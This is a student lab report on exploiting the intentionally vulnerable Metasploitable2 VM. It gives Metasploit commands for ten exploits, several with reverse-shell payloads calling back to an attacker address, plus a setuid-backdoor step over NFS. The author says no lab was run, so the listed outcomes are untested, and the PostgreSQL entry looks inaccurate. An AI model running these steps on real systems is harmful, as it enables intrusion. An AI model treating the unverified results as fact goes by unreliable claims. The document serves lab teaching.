# Metasploitable2 Exploitation Report

**Name:** Damte Hackman Darko  
**Index Number:** 7356123  
**Date:** September 21, 2026  
**Target IP:** 192.168.56.101 (placeholder – replace with your actual Metasploitable2 IP)  
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, nmap, searchsploit, hydra  

> **Important Note (Submission under time constraint):**  
> This report was prepared without live access to the lab environment (laptop unavailable). All steps below are the standard, publicly documented exploitation paths for Metasploitable2. Evidence screenshots and live terminal output could not be captured. When lab access is restored, replace the placeholder evidence paths with real screenshots and update the Target IP and any environment-specific details.

---

## Reconnaissance Summary

Command used:
```bash
nmap -sV -sC -p- -T4 192.168.56.101 -oN recon.txt
```

Typical open ports/services discovered on Metasploitable2 (standard fingerprint):

- 21/tcp   – vsftpd 2.3.4
- 22/tcp   – OpenSSH 4.7p1
- 23/tcp   – telnet
- 25/tcp   – Postfix smtpd
- 53/tcp   – ISC BIND 9.4.2
- 80/tcp   – Apache httpd 2.2.8 (PHP 5.2.4)
- 111/tcp  – rpcbind
- 139/tcp  – Samba smbd 3.x
- 445/tcp  – Samba smbd 3.x
- 512/tcp  – exec
- 513/tcp  – login
- 514/tcp  – shell
- 1099/tcp – Java RMI
- 1524/tcp – ingreslock (backdoor)
- 2049/tcp – NFS
- 2121/tcp – ProFTPD 1.3.1
- 3306/tcp – MySQL 5.0.51a
- 5432/tcp – PostgreSQL
- 5900/tcp – VNC
- 6000/tcp – X11
- 6667/tcp – UnrealIRCd
- 8009/tcp – Apache Tomcat AJP
- 8180/tcp – Apache Tomcat
- 8787/tcp – drb
- 3632/tcp – distccd

Evidence: `evidence/recon.png` (placeholder)

---

## Exploit 1: vsftpd 2.3.4 Backdoor

- **Service / Port:** FTP / 21
- **Vulnerability:** vsftpd 2.3.4 backdoor (CVE-2011-2523) – malicious “:)” username opens a shell on port 6200
- **Tool Used:** Metasploit – `exploit/unix/ftp/vsftpd_234_backdoor`
- **Why This Tool:** The module is purpose-built for this exact backdoored version. It automatically sends the trigger username and connects to the resulting shell on port 6200, which is faster and more reliable than manual exploitation.
- **Steps:**
  1. `msfconsole`
  2. `use exploit/unix/ftp/vsftpd_234_backdoor`
  3. `set RHOSTS 192.168.56.101`
  4. `run`
  5. Confirm interactive shell is received
- **Evidence:** `evidence/exploit1.png` (placeholder – shell prompt expected)
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
  - Weaponization: selecting and configuring the Metasploit module + payload.
  - Delivery: connecting to the FTP service and sending the trigger.
  - Exploitation: the backdoor code executes and opens port 6200.
  - Installation / C2: the resulting shell provides interactive control.
- **Outcome / Impact:** Unauthenticated root shell on the target.

---

## Exploit 2: UnrealIRCd Backdoor

- **Service / Port:** IRC / 6667
- **Vulnerability:** UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075)
- **Tool Used:** Metasploit – `exploit/unix/irc/unreal_ircd_3281_backdoor`
- **Why This Tool:** Official Metasploit module specifically detects and triggers the backdoored UnrealIRCd binary shipped with Metasploitable2.
- **Steps:**
  1. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
  2. `set RHOSTS 192.168.56.101`
  3. `set PAYLOAD cmd/unix/reverse`
  4. `set LHOST <attacker-ip>`
  5. `run`
- **Evidence:** `evidence/exploit2.png` (placeholder)
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
  - Same mapping as Exploit 1; the module delivers the trigger and receives a reverse shell.
- **Outcome / Impact:** Root shell via reverse connection.

---

## Exploit 3: Samba “username map script” Command Injection

- **Service / Port:** SMB / 139 & 445
- **Vulnerability:** Samba 3.0.20 – “username map script” allows arbitrary command execution (CVE-2007-2447)
- **Tool Used:** Metasploit – `exploit/multi/samba/usermap_script`
- **Why This Tool:** The module crafts the exact username that triggers the command injection and is the most reliable public exploit for this vulnerability.
- **Steps:**
  1. `use exploit/multi/samba/usermap_script`
  2. `set RHOSTS 192.168.56.101`
  3. `set PAYLOAD cmd/unix/reverse`
  4. `set LHOST <attacker-ip>`
  5. `run`
- **Evidence:** `evidence/exploit3.png` (placeholder)
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Root shell without authentication.

---

## Exploit 4: distcc Remote Code Execution

- **Service / Port:** distccd / 3632
- **Vulnerability:** distcc daemon allows unauthenticated command execution
- **Tool Used:** Metasploit – `exploit/unix/misc/distcc_exec`
- **Why This Tool:** Purpose-built module that speaks the distcc protocol and injects commands cleanly.
- **Steps:**
  1. `use exploit/unix/misc/distcc_exec`
  2. `set RHOSTS 192.168.56.101`
  3. `set PAYLOAD cmd/unix/reverse`
  4. `set LHOST <attacker-ip>`
  5. `run`
- **Evidence:** `evidence/exploit4.png` (placeholder)
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Shell as the distccd user (usually root or high privilege on Metasploitable2).

---

## Exploit 5: PHP CGI Argument Injection (php-cgi)

- **Service / Port:** HTTP / 80
- **Vulnerability:** PHP CGI argument injection (CVE-2012-1823) – allows remote code execution via crafted query string
- **Tool Used:** Metasploit – `exploit/multi/http/php_cgi_arg_injection`
- **Why This Tool:** Correctly crafts the `-d` / `-s` argument injection that works against the vulnerable PHP CGI configuration on Metasploitable2.
- **Steps:**
  1. `use exploit/multi/http/php_cgi_arg_injection`
  2. `set RHOSTS 192.168.56.101`
  3. `set TARGETURI /`
  4. `set PAYLOAD php/meterpreter/reverse_tcp`
  5. `set LHOST <attacker-ip>`
  6. `run`
- **Evidence:** `evidence/exploit5.png` (placeholder)
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
- **Outcome / Impact:** Meterpreter session (can dump files, escalate, etc.).

---

## Exploit 6: Apache Tomcat Manager – Weak Credentials + WAR Deployment

- **Service / Port:** Tomcat / 8180
- **Vulnerability:** Default/weak Tomcat manager credentials (tomcat/tomcat, admin/admin, etc.)
- **Tool Used:** Metasploit – `exploit/multi/http/tomcat_mgr_upload`
- **Why This Tool:** Automates credential testing against the manager application and deploys a malicious WAR in one step.
- **Steps:**
  1. `use exploit/multi/http/tomcat_mgr_upload`
  2. `set RHOSTS 192.168.56.101`
  3. `set RPORT 8180`
  4. `set HttpUsername tomcat`
  5. `set HttpPassword tomcat`
  6. `set PAYLOAD java/meterpreter/reverse_tcp`
  7. `set LHOST <attacker-ip>`
  8. `run`
- **Evidence:** `evidence/exploit6.png` (placeholder)
- **Cyber Kill Chain Stage(s):** Reconnaissance (credential guessing), Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Meterpreter session as the Tomcat user.

---

## Exploit 7: MySQL Weak Root Password + UDF Privilege Escalation

- **Service / Port:** MySQL / 3306
- **Vulnerability:** Root password is blank or “root”; allows UDF library loading for code execution
- **Tool Used:** Metasploit – `exploit/multi/mysql/mysql_udf_payload` (or manual with mysql client + raptor UDF)
- **Why This Tool:** Handles authentication and automatic UDF payload loading for Metasploitable’s MySQL configuration.
- **Steps:**
  1. `use exploit/multi/mysql/mysql_udf_payload`
  2. `set RHOSTS 192.168.56.101`
  3. `set USERNAME root`
  4. `set PASSWORD root` (or blank)
  5. `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
  6. `set LHOST <attacker-ip>`
  7. `run`
- **Evidence:** `evidence/exploit7.png` (placeholder)
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Root-level Meterpreter session via MySQL UDF.

---

## Exploit 8: PostgreSQL Weak Credentials + COPY TO PROGRAM

- **Service / Port:** PostgreSQL / 5432
- **Vulnerability:** Weak/default credentials (postgres / postgres) + ability to execute OS commands via `COPY ... TO PROGRAM`
- **Tool Used:** Metasploit – `exploit/linux/postgres/postgres_payload` or manual `psql`
- **Why This Tool:** Automates authentication and payload delivery through the PostgreSQL protocol.
- **Steps:**
  1. `use exploit/linux/postgres/postgres_payload`
  2. `set RHOSTS 192.168.56.101`
  3. `set USERNAME postgres`
  4. `set PASSWORD postgres`
  5. `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
  6. `set LHOST <attacker-ip>`
  7. `run`
- **Evidence:** `evidence/exploit8.png` (placeholder)
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Shell / Meterpreter as the postgres user.

---

## Exploit 9: NFS Share with no_root_squash

- **Service / Port:** NFS / 2049
- **Vulnerability:** `/` exported with `no_root_squash`, allowing root-owned file creation on the target
- **Tool Used:** Native Linux tools (`showmount`, `mount`, `bash`)
- **Why This Tool:** No Metasploit module needed; the vulnerability is a pure misconfiguration best demonstrated with standard NFS client tools.
- **Steps:**
  1. `showmount -e 192.168.56.101`
  2. `mkdir /tmp/nfs`
  3. `mount -t nfs 192.168.56.101:/ /tmp/nfs -o nolock`
  4. Create a setuid shell or add SSH key as root inside the mounted filesystem
  5. `umount /tmp/nfs` and use the planted backdoor
- **Evidence:** `evidence/exploit9.png` (placeholder)
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Installation, Actions on Objectives
- **Outcome / Impact:** Root access via planted setuid binary or SSH key.

---

## Exploit 10: Java RMI Registry Deserialization / RMI Exploitation

- **Service / Port:** Java RMI / 1099
- **Vulnerability:** Unauthenticated Java RMI registry allowing remote code execution
- **Tool Used:** Metasploit – `exploit/multi/misc/java_rmi_server`
- **Why This Tool:** Correctly targets the exposed RMI registry and delivers a Java payload that works against Metasploitable’s configuration.
- **Steps:**
  1. `use exploit/multi/misc/java_rmi_server`
  2. `set RHOSTS 192.168.56.101`
  3. `set PAYLOAD java/meterpreter/reverse_tcp`
  4. `set LHOST <attacker-ip>`
  5. `run`
- **Evidence:** `evidence/exploit10.png` (placeholder)
- **Cyber Kill Chain Stage(s):** Weaponization, Delivery, Exploitation, Installation, C2
- **Outcome / Impact:** Meterpreter session via Java RMI.

---

## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. vsftpd 2.3.4 Backdoor | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 2. UnrealIRCd Backdoor | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 3. Samba usermap_script | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 4. distcc RCE | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 5. PHP CGI Arg Injection | | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| 6. Tomcat Manager WAR | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 7. MySQL UDF | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 8. PostgreSQL Payload | | ✔ | ✔ | ✔ | ✔ | ✔ | |
| 9. NFS no_root_squash | ✔ | | ✔ | ✔ | ✔ | | ✔ |
| 10. Java RMI | | ✔ | ✔ | ✔ | ✔ | ✔ | |

---

## Lessons Learned / Mitigations

1. **vsftpd 2.3.4 / UnrealIRCd backdoors**  
   Never run software that has been intentionally backdoored. Always verify package integrity and use official, up-to-date repositories.

2. **Samba username map script**  
   Disable the “username map script” option or upgrade Samba to a version that no longer evaluates the script with elevated privileges. Restrict SMB access with firewall rules.

3. **NFS no_root_squash**  
   Never export filesystems with `no_root_squash` unless absolutely required and tightly controlled. Prefer `root_squash` and limit exports to specific, trusted hosts.

4. **Weak/default credentials (Tomcat, MySQL, PostgreSQL)**  
   Change all default passwords immediately. Enforce strong password policies and disable remote root/postgres logins where possible.

5. **General**  
   Apply the principle of least privilege, keep services patched, and never expose intentionally vulnerable systems to untrusted networks.
